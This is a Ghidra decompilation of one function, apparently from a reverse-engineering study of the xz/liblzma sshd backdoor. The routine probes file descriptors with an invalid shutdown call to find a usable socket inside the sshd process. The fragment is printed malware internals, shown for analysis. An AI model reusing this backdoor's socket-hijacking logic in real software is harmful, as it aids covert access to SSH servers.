// /home/kali/xzre-ghidra/xzregh/107BC0_sshd_get_usable_socket.c
// Function: sshd_get_usable_socket @ 0x107BC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_usable_socket(int * pSock, int socket_index, libc_imports_t * imports)


BOOL sshd_get_usable_socket(int *pSock,int socket_index,libc_imports_t *imports)

{
  int iVar1;
  int *piVar2;
  int sockfd;
  int iVar3;
  int local_3c [3];
  
  if (pSock == (int *)0x0) {
    return 0;
  }
  if (imports != (libc_imports_t *)0x0) {
    iVar3 = -1;
    sockfd = 0;
    do {
      local_3c[0] = 0;
      if ((imports->shutdown != (_func_28 *)0x0) && (imports->__errno_location != (_func_26 *)0x0))
      {
        iVar1 = (*imports->shutdown)(sockfd,0x7fffffff);
        if (iVar1 < 0) {
          piVar2 = (*imports->__errno_location)();
LAB_00107c21:
          if ((*piVar2 != 0x16) && (*piVar2 != 0x6b)) goto LAB_00107c40;
        }
        else {
          piVar2 = local_3c;
          if (iVar1 != 0) goto LAB_00107c21;
        }
        iVar3 = iVar3 + 1;
        if (iVar3 == socket_index) {
          *pSock = sockfd;
          return 1;
        }
      }
LAB_00107c40:
      sockfd = sockfd + 1;
    } while (sockfd != 0x40);
  }
  return 0;
}

